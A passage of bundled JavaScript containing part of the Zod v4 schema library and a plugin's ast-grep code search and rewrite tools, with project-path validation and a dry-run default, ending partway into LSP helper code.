  return _stringFormat2(ZodCustomStringFormat2, format, regex, params);
}
var ZodNumber2 = /* @__PURE__ */ $constructor2("ZodNumber", (inst, def) => {
  $ZodNumber2.init(inst, def);
  ZodType2.init(inst, def);
  inst.gt = (value, params) => inst.check(_gt2(value, params));
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.lt = (value, params) => inst.check(_lt2(value, params));
  inst.lte = (value, params) => inst.check(_lte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  inst.int = (params) => inst.check(int2(params));
  inst.safe = (params) => inst.check(int2(params));
  inst.positive = (params) => inst.check(_gt2(0, params));
  inst.nonnegative = (params) => inst.check(_gte2(0, params));
  inst.negative = (params) => inst.check(_lt2(0, params));
  inst.nonpositive = (params) => inst.check(_lte2(0, params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf2(value, params));
  inst.step = (value, params) => inst.check(_multipleOf2(value, params));
  inst.finite = () => inst;
  const bag = inst._zod.bag;
  inst.minValue = Math.max(bag.minimum ?? Number.NEGATIVE_INFINITY, bag.exclusiveMinimum ?? Number.NEGATIVE_INFINITY) ?? null;
  inst.maxValue = Math.min(bag.maximum ?? Number.POSITIVE_INFINITY, bag.exclusiveMaximum ?? Number.POSITIVE_INFINITY) ?? null;
  inst.isInt = (bag.format ?? "").includes("int") || Number.isSafeInteger(bag.multipleOf ?? 0.5);
  inst.isFinite = true;
  inst.format = bag.format ?? null;
});
function number5(params) {
  return _number2(ZodNumber2, params);
}
var ZodNumberFormat2 = /* @__PURE__ */ $constructor2("ZodNumberFormat", (inst, def) => {
  $ZodNumberFormat2.init(inst, def);
  ZodNumber2.init(inst, def);
});
function int2(params) {
  return _int2(ZodNumberFormat2, params);
}
function float322(params) {
  return _float322(ZodNumberFormat2, params);
}
function float642(params) {
  return _float642(ZodNumberFormat2, params);
}
function int322(params) {
  return _int322(ZodNumberFormat2, params);
}
function uint322(params) {
  return _uint322(ZodNumberFormat2, params);
}
var ZodBoolean2 = /* @__PURE__ */ $constructor2("ZodBoolean", (inst, def) => {
  $ZodBoolean2.init(inst, def);
  ZodType2.init(inst, def);
});
function boolean5(params) {
  return _boolean2(ZodBoolean2, params);
}
var ZodBigInt2 = /* @__PURE__ */ $constructor2("ZodBigInt", (inst, def) => {
  $ZodBigInt2.init(inst, def);
  ZodType2.init(inst, def);
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.gt = (value, params) => inst.check(_gt2(value, params));
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.lt = (value, params) => inst.check(_lt2(value, params));
  inst.lte = (value, params) => inst.check(_lte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  inst.positive = (params) => inst.check(_gt2(BigInt(0), params));
  inst.negative = (params) => inst.check(_lt2(BigInt(0), params));
  inst.nonpositive = (params) => inst.check(_lte2(BigInt(0), params));
  inst.nonnegative = (params) => inst.check(_gte2(BigInt(0), params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf2(value, params));
  const bag = inst._zod.bag;
  inst.minValue = bag.minimum ?? null;
  inst.maxValue = bag.maximum ?? null;
  inst.format = bag.format ?? null;
});
function bigint5(params) {
  return _bigint2(ZodBigInt2, params);
}
var ZodBigIntFormat2 = /* @__PURE__ */ $constructor2("ZodBigIntFormat", (inst, def) => {
  $ZodBigIntFormat2.init(inst, def);
  ZodBigInt2.init(inst, def);
});
function int642(params) {
  return _int642(ZodBigIntFormat2, params);
}
function uint642(params) {
  return _uint642(ZodBigIntFormat2, params);
}
var ZodSymbol2 = /* @__PURE__ */ $constructor2("ZodSymbol", (inst, def) => {
  $ZodSymbol2.init(inst, def);
  ZodType2.init(inst, def);
});
function symbol2(params) {
  return _symbol2(ZodSymbol2, params);
}
var ZodUndefined2 = /* @__PURE__ */ $constructor2("ZodUndefined", (inst, def) => {
  $ZodUndefined2.init(inst, def);
  ZodType2.init(inst, def);
});
function _undefined6(params) {
  return _undefined5(ZodUndefined2, params);
}
var ZodNull2 = /* @__PURE__ */ $constructor2("ZodNull", (inst, def) => {
  $ZodNull2.init(inst, def);
  ZodType2.init(inst, def);
});
function _null6(params) {
  return _null5(ZodNull2, params);
}
var ZodAny2 = /* @__PURE__ */ $constructor2("ZodAny", (inst, def) => {
  $ZodAny2.init(inst, def);
  ZodType2.init(inst, def);
});
function any2() {
  return _any2(ZodAny2);
}
var ZodUnknown2 = /* @__PURE__ */ $constructor2("ZodUnknown", (inst, def) => {
  $ZodUnknown2.init(inst, def);
  ZodType2.init(inst, def);
});
function unknown2() {
  return _unknown2(ZodUnknown2);
}
var ZodNever2 = /* @__PURE__ */ $constructor2("ZodNever", (inst, def) => {
  $ZodNever2.init(inst, def);
  ZodType2.init(inst, def);
});
function never2(params) {
  return _never2(ZodNever2, params);
}
var ZodVoid2 = /* @__PURE__ */ $constructor2("ZodVoid", (inst, def) => {
  $ZodVoid2.init(inst, def);
  ZodType2.init(inst, def);
});
function _void4(params) {
  return _void3(ZodVoid2, params);
}
var ZodDate2 = /* @__PURE__ */ $constructor2("ZodDate", (inst, def) => {
  $ZodDate2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  const c = inst._zod.bag;
  inst.minDate = c.minimum ? new Date(c.minimum) : null;
  inst.maxDate = c.maximum ? new Date(c.maximum) : null;
});
function date7(params) {
  return _date2(ZodDate2, params);
}
var ZodArray2 = /* @__PURE__ */ $constructor2("ZodArray", (inst, def) => {
  $ZodArray2.init(inst, def);
  ZodType2.init(inst, def);
  inst.element = def.element;
  inst.min = (minLength, params) => inst.check(_minLength2(minLength, params));
  inst.nonempty = (params) => inst.check(_minLength2(1, params));
  inst.max = (maxLength, params) => inst.check(_maxLength2(maxLength, params));
  inst.length = (len, params) => inst.check(_length2(len, params));
  inst.unwrap = () => inst.element;
});
function array2(element, params) {
  return _array2(ZodArray2, element, params);
}
function keyof2(schema) {
  const shape = schema._zod.def.shape;
  return _enum4(Object.keys(shape));
}
var ZodObject2 = /* @__PURE__ */ $constructor2("ZodObject", (inst, def) => {
  $ZodObjectJIT2.init(inst, def);
  ZodType2.init(inst, def);
  exports_util2.defineLazy(inst, "shape", () => def.shape);
  inst.keyof = () => _enum4(Object.keys(inst._zod.def.shape));
  inst.catchall = (catchall) => inst.clone({ ...inst._zod.def, catchall });
  inst.passthrough = () => inst.clone({ ...inst._zod.def, catchall: unknown2() });
  inst.loose = () => inst.clone({ ...inst._zod.def, catchall: unknown2() });
  inst.strict = () => inst.clone({ ...inst._zod.def, catchall: never2() });
  inst.strip = () => inst.clone({ ...inst._zod.def, catchall: undefined });
  inst.extend = (incoming) => {
    return exports_util2.extend(inst, incoming);
  };
  inst.safeExtend = (incoming) => {
    return exports_util2.safeExtend(inst, incoming);
  };
  inst.merge = (other) => exports_util2.merge(inst, other);
  inst.pick = (mask) => exports_util2.pick(inst, mask);
  inst.omit = (mask) => exports_util2.omit(inst, mask);
  inst.partial = (...args) => exports_util2.partial(ZodOptional2, inst, args[0]);
  inst.required = (...args) => exports_util2.required(ZodNonOptional2, inst, args[0]);
});
function object2(shape, params) {
  const def = {
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", shape ? exports_util2.objectClone(shape) : {});
      return this.shape;
    },
    ...exports_util2.normalizeParams(params)
  };
  return new ZodObject2(def);
}
function strictObject2(shape, params) {
  return new ZodObject2({
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", exports_util2.objectClone(shape));
      return this.shape;
    },
    catchall: never2(),
    ...exports_util2.normalizeParams(params)
  });
}
function looseObject2(shape, params) {
  return new ZodObject2({
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", exports_util2.objectClone(shape));
      return this.shape;
    },
    catchall: unknown2(),
    ...exports_util2.normalizeParams(params)
  });
}
var ZodUnion2 = /* @__PURE__ */ $constructor2("ZodUnion", (inst, def) => {
  $ZodUnion2.init(inst, def);
  ZodType2.init(inst, def);
  inst.options = def.options;
});
function union2(options, params) {
  return new ZodUnion2({
    type: "union",
    options,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodDiscriminatedUnion2 = /* @__PURE__ */ $constructor2("ZodDiscriminatedUnion", (inst, def) => {
  ZodUnion2.init(inst, def);
  $ZodDiscriminatedUnion2.init(inst, def);
});
function discriminatedUnion2(discriminator, options, params) {
  return new ZodDiscriminatedUnion2({
    type: "union",
    options,
    discriminator,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodIntersection2 = /* @__PURE__ */ $constructor2("ZodIntersection", (inst, def) => {
  $ZodIntersection2.init(inst, def);
  ZodType2.init(inst, def);
});
function intersection2(left, right) {
  return new ZodIntersection2({
    type: "intersection",
    left,
    right
  });
}
var ZodTuple2 = /* @__PURE__ */ $constructor2("ZodTuple", (inst, def) => {
  $ZodTuple2.init(inst, def);
  ZodType2.init(inst, def);
  inst.rest = (rest) => inst.clone({
    ...inst._zod.def,
    rest
  });
});
function tuple2(items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType2;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new ZodTuple2({
    type: "tuple",
    items,
    rest,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodRecord2 = /* @__PURE__ */ $constructor2("ZodRecord", (inst, def) => {
  $ZodRecord2.init(inst, def);
  ZodType2.init(inst, def);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function record2(keyType, valueType, params) {
  return new ZodRecord2({
    type: "record",
    keyType,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
function partialRecord2(keyType, valueType, params) {
  const k = clone2(keyType);
  k._zod.values = undefined;
  return new ZodRecord2({
    type: "record",
    keyType: k,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodMap2 = /* @__PURE__ */ $constructor2("ZodMap", (inst, def) => {
  $ZodMap2.init(inst, def);
  ZodType2.init(inst, def);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function map2(keyType, valueType, params) {
  return new ZodMap2({
    type: "map",
    keyType,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodSet2 = /* @__PURE__ */ $constructor2("ZodSet", (inst, def) => {
  $ZodSet2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (...args) => inst.check(_minSize2(...args));
  inst.nonempty = (params) => inst.check(_minSize2(1, params));
  inst.max = (...args) => inst.check(_maxSize2(...args));
  inst.size = (...args) => inst.check(_size2(...args));
});
function set2(valueType, params) {
  return new ZodSet2({
    type: "set",
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodEnum2 = /* @__PURE__ */ $constructor2("ZodEnum", (inst, def) => {
  $ZodEnum2.init(inst, def);
  ZodType2.init(inst, def);
  inst.enum = def.entries;
  inst.options = Object.values(def.entries);
  const keys = new Set(Object.keys(def.entries));
  inst.extract = (values, params) => {
    const newEntries = {};
    for (const value of values) {
      if (keys.has(value)) {
        newEntries[value] = def.entries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum2({
      ...def,
      checks: [],
      ...exports_util2.normalizeParams(params),
      entries: newEntries
    });
  };
  inst.exclude = (values, params) => {
    const newEntries = { ...def.entries };
    for (const value of values) {
      if (keys.has(value)) {
        delete newEntries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum2({
      ...def,
      checks: [],
      ...exports_util2.normalizeParams(params),
      entries: newEntries
    });
  };
});
function _enum4(values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new ZodEnum2({
    type: "enum",
    entries,
    ...exports_util2.normalizeParams(params)
  });
}
function nativeEnum2(entries, params) {
  return new ZodEnum2({
    type: "enum",
    entries,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodLiteral2 = /* @__PURE__ */ $constructor2("ZodLiteral", (inst, def) => {
  $ZodLiteral2.init(inst, def);
  ZodType2.init(inst, def);
  inst.values = new Set(def.values);
  Object.defineProperty(inst, "value", {
    get() {
      if (def.values.length > 1) {
        throw new Error("This schema contains multiple valid literal values. Use `.values` instead.");
      }
      return def.values[0];
    }
  });
});
function literal2(value, params) {
  return new ZodLiteral2({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...exports_util2.normalizeParams(params)
  });
}
var ZodFile2 = /* @__PURE__ */ $constructor2("ZodFile", (inst, def) => {
  $ZodFile2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (size, params) => inst.check(_minSize2(size, params));
  inst.max = (size, params) => inst.check(_maxSize2(size, params));
  inst.mime = (types, params) => inst.check(_mime2(Array.isArray(types) ? types : [types], params));
});
function file2(params) {
  return _file2(ZodFile2, params);
}
var ZodTransform2 = /* @__PURE__ */ $constructor2("ZodTransform", (inst, def) => {
  $ZodTransform2.init(inst, def);
  ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (_ctx.direction === "backward") {
      throw new $ZodEncodeError2(inst.constructor.name);
    }
    payload.addIssue = (issue3) => {
      if (typeof issue3 === "string") {
        payload.issues.push(exports_util2.issue(issue3, payload.value, def));
      } else {
        const _issue = issue3;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = inst);
        payload.issues.push(exports_util2.issue(_issue));
      }
    };
    const output = def.transform(payload.value, payload);
    if (output instanceof Promise) {
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    payload.value = output;
    return payload;
  };
});
function transform2(fn) {
  return new ZodTransform2({
    type: "transform",
    transform: fn
  });
}
var ZodOptional2 = /* @__PURE__ */ $constructor2("ZodOptional", (inst, def) => {
  $ZodOptional2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function optional2(innerType) {
  return new ZodOptional2({
    type: "optional",
    innerType
  });
}
var ZodNullable2 = /* @__PURE__ */ $constructor2("ZodNullable", (inst, def) => {
  $ZodNullable2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nullable2(innerType) {
  return new ZodNullable2({
    type: "nullable",
    innerType
  });
}
function nullish4(innerType) {
  return optional2(nullable2(innerType));
}
var ZodDefault2 = /* @__PURE__ */ $constructor2("ZodDefault", (inst, def) => {
  $ZodDefault2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeDefault = inst.unwrap;
});
function _default4(innerType, defaultValue) {
  return new ZodDefault2({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util2.shallowClone(defaultValue);
    }
  });
}
var ZodPrefault2 = /* @__PURE__ */ $constructor2("ZodPrefault", (inst, def) => {
  $ZodPrefault2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function prefault2(innerType, defaultValue) {
  return new ZodPrefault2({
    type: "prefault",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util2.shallowClone(defaultValue);
    }
  });
}
var ZodNonOptional2 = /* @__PURE__ */ $constructor2("ZodNonOptional", (inst, def) => {
  $ZodNonOptional2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nonoptional2(innerType, params) {
  return new ZodNonOptional2({
    type: "nonoptional",
    innerType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodSuccess2 = /* @__PURE__ */ $constructor2("ZodSuccess", (inst, def) => {
  $ZodSuccess2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function success2(innerType) {
  return new ZodSuccess2({
    type: "success",
    innerType
  });
}
var ZodCatch2 = /* @__PURE__ */ $constructor2("ZodCatch", (inst, def) => {
  $ZodCatch2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeCatch = inst.unwrap;
});
function _catch4(innerType, catchValue) {
  return new ZodCatch2({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
var ZodNaN2 = /* @__PURE__ */ $constructor2("ZodNaN", (inst, def) => {
  $ZodNaN2.init(inst, def);
  ZodType2.init(inst, def);
});
function nan2(params) {
  return _nan2(ZodNaN2, params);
}
var ZodPipe2 = /* @__PURE__ */ $constructor2("ZodPipe", (inst, def) => {
  $ZodPipe2.init(inst, def);
  ZodType2.init(inst, def);
  inst.in = def.in;
  inst.out = def.out;
});
function pipe2(in_, out) {
  return new ZodPipe2({
    type: "pipe",
    in: in_,
    out
  });
}
var ZodCodec2 = /* @__PURE__ */ $constructor2("ZodCodec", (inst, def) => {
  ZodPipe2.init(inst, def);
  $ZodCodec2.init(inst, def);
});
function codec2(in_, out, params) {
  return new ZodCodec2({
    type: "pipe",
    in: in_,
    out,
    transform: params.decode,
    reverseTransform: params.encode
  });
}
var ZodReadonly2 = /* @__PURE__ */ $constructor2("ZodReadonly", (inst, def) => {
  $ZodReadonly2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function readonly2(innerType) {
  return new ZodReadonly2({
    type: "readonly",
    innerType
  });
}
var ZodTemplateLiteral2 = /* @__PURE__ */ $constructor2("ZodTemplateLiteral", (inst, def) => {
  $ZodTemplateLiteral2.init(inst, def);
  ZodType2.init(inst, def);
});
function templateLiteral2(parts, params) {
  return new ZodTemplateLiteral2({
    type: "template_literal",
    parts,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodLazy2 = /* @__PURE__ */ $constructor2("ZodLazy", (inst, def) => {
  $ZodLazy2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.getter();
});
function lazy2(getter) {
  return new ZodLazy2({
    type: "lazy",
    getter
  });
}
var ZodPromise2 = /* @__PURE__ */ $constructor2("ZodPromise", (inst, def) => {
  $ZodPromise2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function promise2(innerType) {
  return new ZodPromise2({
    type: "promise",
    innerType
  });
}
var ZodFunction2 = /* @__PURE__ */ $constructor2("ZodFunction", (inst, def) => {
  $ZodFunction2.init(inst, def);
  ZodType2.init(inst, def);
});
function _function2(params) {
  return new ZodFunction2({
    type: "function",
    input: Array.isArray(params?.input) ? tuple2(params?.input) : params?.input ?? array2(unknown2()),
    output: params?.output ?? unknown2()
  });
}
var ZodCustom2 = /* @__PURE__ */ $constructor2("ZodCustom", (inst, def) => {
  $ZodCustom2.init(inst, def);
  ZodType2.init(inst, def);
});
function check2(fn) {
  const ch = new $ZodCheck2({
    check: "custom"
  });
  ch._zod.check = fn;
  return ch;
}
function custom2(fn, _params) {
  return _custom2(ZodCustom2, fn ?? (() => true), _params);
}
function refine2(fn, _params = {}) {
  return _refine2(ZodCustom2, fn, _params);
}
function superRefine2(fn) {
  return _superRefine2(fn);
}
function _instanceof2(cls, params = {
  error: `Input not instance of ${cls.name}`
}) {
  const inst = new ZodCustom2({
    type: "custom",
    check: "custom",
    fn: (data) => data instanceof cls,
    abort: true,
    ...exports_util2.normalizeParams(params)
  });
  inst._zod.bag.Class = cls;
  return inst;
}
var stringbool2 = (...args) => _stringbool2({
  Codec: ZodCodec2,
  Boolean: ZodBoolean2,
  String: ZodString2
}, ...args);
function json2(params) {
  const jsonSchema = lazy2(() => {
    return union2([string5(params), number5(), boolean5(), _null6(), array2(jsonSchema), record2(string5(), jsonSchema)]);
  });
  return jsonSchema;
}
function preprocess2(fn, schema) {
  return pipe2(transform2(fn), schema);
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/compat.js
var ZodIssueCode2 = {
  invalid_type: "invalid_type",
  too_big: "too_big",
  too_small: "too_small",
  invalid_format: "invalid_format",
  not_multiple_of: "not_multiple_of",
  unrecognized_keys: "unrecognized_keys",
  invalid_union: "invalid_union",
  invalid_key: "invalid_key",
  invalid_element: "invalid_element",
  invalid_value: "invalid_value",
  custom: "custom"
};
function setErrorMap2(map3) {
  config2({
    customError: map3
  });
}
function getErrorMap2() {
  return config2().customError;
}
var ZodFirstPartyTypeKind2;
(function(ZodFirstPartyTypeKind3) {})(ZodFirstPartyTypeKind2 || (ZodFirstPartyTypeKind2 = {}));
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/coerce.js
var exports_coerce2 = {};
__export(exports_coerce2, {
  string: () => string6,
  number: () => number6,
  date: () => date8,
  boolean: () => boolean6,
  bigint: () => bigint6
});
function string6(params) {
  return _coercedString2(ZodString2, params);
}
function number6(params) {
  return _coercedNumber2(ZodNumber2, params);
}
function boolean6(params) {
  return _coercedBoolean2(ZodBoolean2, params);
}
function bigint6(params) {
  return _coercedBigint2(ZodBigInt2, params);
}
function date8(params) {
  return _coercedDate2(ZodDate2, params);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/external.js
config2(en_default2());
// node_modules/@opencode-ai/plugin/dist/tool.js
function tool(input) {
  return input;
}
tool.schema = exports_external2;
// src/tools/ast-tools.ts
import { spawn } from "child_process";
import { isAbsolute as isAbsolute2, relative, resolve as resolve3 } from "path";
var schema = tool.schema;
function isInsideRoot(root, candidatePath) {
  const rootAbs = resolve3(root);
  const targetAbs = resolve3(candidatePath);
  const rel = relative(rootAbs, targetAbs);
  if (!rel)
    return true;
  return !rel.startsWith("..") && !isAbsolute2(rel);
}
function validateSearchPaths(projectDir, paths) {
  const normalized = [];
  for (const raw of paths) {
    const p = raw.trim();
    if (!p)
      continue;
    const abs = isAbsolute2(p) ? p : resolve3(projectDir, p);
    if (!isInsideRoot(projectDir, abs)) {
      return { ok: false, reason: `path must be inside projectDir: ${p}` };
    }
    normalized.push(p);
  }
  if (normalized.length === 0) {
    return { ok: true, paths: ["."] };
  }
  return { ok: true, paths: normalized };
}
function validateGlobs(globs) {
  const normalized = [];
  for (const raw of globs ?? []) {
    const g = raw.trim();
    if (!g)
      continue;
    if (g.startsWith("/") || g.startsWith("~") || g.startsWith("..")) {
      return { ok: false, reason: `glob must be project-relative: ${g}` };
    }
    normalized.push(g);
  }
  return { ok: true, globs: normalized };
}
function buildSgRunCommand(args) {
  const cmd = [
    "bun",
    "x",
    "sg",
    "run",
    "--color",
    "never",
    "--heading",
    "never",
    "--pattern",
    args.pattern
  ];
  if (args.lang && args.lang.trim().length > 0) {
    cmd.push("--lang", args.lang.trim());
  }
  if (args.selector && args.selector.trim().length > 0) {
    cmd.push("--selector", args.selector.trim());
  }
  if (args.strictness) {
    cmd.push("--strictness", args.strictness);
  }
  if (typeof args.context === "number" && Number.isFinite(args.context) && args.context > 0) {
    cmd.push("--context", String(Math.floor(args.context)));
  }
  const globs = Array.isArray(args.globs) ? args.globs : [];
  for (const g of globs) {
    if (typeof g === "string" && g.trim().length > 0) {
      cmd.push("--globs", g.trim());
    }
  }
  if (args.rewrite !== undefined) {
    cmd.push("--rewrite", args.rewrite);
    if (args.updateAll) {
      cmd.push("--update-all");
    }
  }
  if (args.output === "json") {
    cmd.push("--json=compact");
  }
  cmd.push(...args.paths);
  return cmd;
}
function truncate(text, maxChars) {
  if (text.length <= maxChars)
    return { text, truncated: false };
  return { text: text.slice(0, maxChars), truncated: true };
}
async function runSg(params) {
  const paths = params.args.paths && params.args.paths.length > 0 ? params.args.paths : ["."];
  const cmd = buildSgRunCommand({
    pattern: params.args.pattern,
    rewrite: params.args.rewrite,
    updateAll: params.args.updateAll,
    lang: params.args.lang,
    selector: params.args.selector,
    strictness: params.args.strictness,
    context: params.args.context,
    output: params.args.output,
    globs: params.args.globs,
    paths
  });
  const child = spawn(cmd[0], cmd.slice(1), {
    cwd: params.directory,
    env: {
      ...process.env,
      CI: "true",
      NO_COLOR: "1",
      TERM: "dumb"
    },
    stdio: ["pipe", "pipe", "pipe"]
  });
  let timedOut = false;
  const killer = () => {
    try {
      if (!child.killed) {
        child.kill();
      }
    } catch {}
  };
  const timeout = setTimeout(() => {
    timedOut = true;
    killer();
  }, Math.max(100, params.timeoutMs));
  const abortListener = () => {
    killer();
  };
  if (params.abort) {
    if (params.abort.aborted) {
      killer();
    } else {
      params.abort.addEventListener("abort", abortListener, { once: true });
    }
  }
  const collect = async (stream) => {
    if (!stream)
      return Buffer.from("");
    const chunks = [];
    for await (const chunk of stream) {
      chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
    }
    return Buffer.concat(chunks);
  };
  const exited = new Promise((resolveExit) => {
    child.once("close", (code) => {
      resolveExit(typeof code === "number" ? code : 1);
    });
  });
  const [stdoutBytes, stderrBytes, exitCode] = await Promise.all([
    collect(child.stdout),
    collect(child.stderr),
    exited
  ]);
  clearTimeout(timeout);
  if (params.abort && !params.abort.aborted) {
    params.abort.removeEventListener("abort", abortListener);
  }
  const stdout = stdoutBytes.toString("utf-8");
  const stderr = stderrBytes.toString("utf-8");
  return { ok: exitCode === 0, exitCode, stdout, stderr, command: cmd, timedOut };
}
function createAstGrepTools(params) {
  const directory = params.projectDir;
  const timeoutMs = typeof params.timeoutMs === "number" && Number.isFinite(params.timeoutMs) ? params.timeoutMs : 30000;
  const MAX_OUT = 12000;
  return {
    ctf_ast_grep_search: tool({
      description: "AST-grep: search code by AST pattern (uses bun x sg)",
      args: {
        pattern: schema.string().min(1),
        lang: schema.string().optional(),
        paths: schema.array(schema.string().min(1)).optional(),
        globs: schema.array(schema.string().min(1)).optional(),
        selector: schema.string().optional(),
        strictness: schema.enum(["cst", "smart", "ast", "relaxed", "signature", "template"]).optional(),
        context: schema.number().int().min(0).max(50).optional(),
        output: schema.enum(["text", "json"]).optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const validatedPaths = validateSearchPaths(directory, args.paths ?? ["."]);
        if (!validatedPaths.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedPaths.reason }, null, 2);
        }
        const validatedGlobs = validateGlobs(args.globs);
        if (!validatedGlobs.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedGlobs.reason }, null, 2);
        }
        const result = await runSg({
          directory,
          timeoutMs,
          abort: context.abort,
          args: {
            pattern: args.pattern,
            lang: args.lang,
            paths: validatedPaths.paths,
            globs: validatedGlobs.globs,
            selector: args.selector,
            strictness: args.strictness,
            context: args.context,
            output: args.output
          }
        });
        const out = truncate(result.stdout, MAX_OUT);
        const err = truncate(result.stderr, MAX_OUT);
        return JSON.stringify({
          sessionID,
          ok: result.ok,
          exitCode: result.exitCode,
          timedOut: result.timedOut,
          command: result.command,
          stdout: out.text,
          stderr: err.text,
          stdoutTruncated: out.truncated,
          stderrTruncated: err.truncated
        }, null, 2);
      }
    }),
    ctf_ast_grep_replace: tool({
      description: "AST-grep: rewrite code by AST pattern (defaults to dry-run)",
      args: {
        pattern: schema.string().min(1),
        rewrite: schema.string().min(0),
        lang: schema.string().optional(),
        paths: schema.array(schema.string().min(1)).optional(),
        globs: schema.array(schema.string().min(1)).optional(),
        selector: schema.string().optional(),
        strictness: schema.enum(["cst", "smart", "ast", "relaxed", "signature", "template"]).optional(),
        context: schema.number().int().min(0).max(50).optional(),
        apply: schema.boolean().optional(),
        output: schema.enum(["text", "json"]).optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const mode = params.getMode(sessionID);
        const apply = Boolean(args.apply);
        if (apply && mode === "BOUNTY") {
          return JSON.stringify({
            sessionID,
            ok: false,
            reason: "Refusing to apply AST rewrite in BOUNTY mode. Run with apply=false for dry-run output."
          }, null, 2);
        }
        const validatedPaths = validateSearchPaths(directory, args.paths ?? ["."]);
        if (!validatedPaths.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedPaths.reason }, null, 2);
        }
        const validatedGlobs = validateGlobs(args.globs);
        if (!validatedGlobs.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedGlobs.reason }, null, 2);
        }
        const result = await runSg({
          directory,
          timeoutMs,
          abort: context.abort,
          args: {
            pattern: args.pattern,
            rewrite: args.rewrite,
            updateAll: apply,
            lang: args.lang,
            paths: validatedPaths.paths,
            globs: validatedGlobs.globs,
            selector: args.selector,
            strictness: args.strictness,
            context: args.context,
            output: args.output
          }
        });
        const out = truncate(result.stdout, MAX_OUT);
        const err = truncate(result.stderr, MAX_OUT);
        return JSON.stringify({
          sessionID,
          mode,
          apply,
          ok: result.ok,
          exitCode: result.exitCode,
          timedOut: result.timedOut,
          command: result.command,
          stdout: out.text,
          stderr: err.text,
          stdoutTruncated: out.truncated,
          stderrTruncated: err.truncated,
          note: apply ? "Applied rewrite with --update-all." : "Dry-run only. No files were modified."
        }, null, 2);
      }
    })
  };
}

// src/tools/lsp-tools.ts
var schema2 = tool.schema;
var hasError2 = hasErrorResponse;
function extractLspApi(client) {
  const lsp = client?.lsp;
  if (!lsp || typeof lsp !== "object")
    return null;
  return lsp;
}
async function callLspOperation(client, op, directory, args) {
  const api3 = extractLspApi(client);
  const fn = api3 ? api3[op] : undefined;
  if (typeof fn !== "function") {
    return { ok: false, reason: "client.lsp operation unavailable" };
  }
  try {
    const primary = await fn({ query: { directory, ...args } });
    if (!hasError2(primary)) {
      return { ok: true, data: primary?.data ?? primary };
    }
  } catch (error92) {}
  try {
    const fallback = await fn({ directory, ...args });
    if (!hasError2(fallback)) {
      return { ok: true, data: fallback?.data ?? fallback };
    }
  } catch (error92) {
    const message = error92 instanceof Error ? error92.message : String(error92);
    return { ok: false, reason: message };
